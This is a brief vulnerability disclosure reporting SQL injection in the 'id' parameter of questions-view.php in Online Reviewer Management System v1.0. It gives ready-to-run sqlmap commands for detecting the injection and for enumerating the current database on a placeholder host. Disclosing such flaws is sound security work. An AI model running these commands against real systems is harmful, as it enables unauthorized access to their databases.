# Online Reviewer Management System v1.0 by janobe has SQL injection

BUG_Author: believeti

Vulnerability File: /reviewer_0/admins/assessments/pretest/questions-view.php

Parameter "id" (GET), exists SQL injection vulnerability

sqlmap detect injection vulnerabilities: "sqlmap -u http://ip/reviewer_0/admins/assessments/pretest/questions-view.php?id=1"

sqlmap injection result

![image](https://github.com/believeti/pic/blob/main/sqlOne.png)

sqlmap Queries the current database: "sqlmap -u http://ip/reviewer_0/admins/assessments/pretest/questions-view.php?id=1 --current-db"

sqlmap injection result

![image](https://github.com/believeti/pic/blob/main/sqlTwo.png)
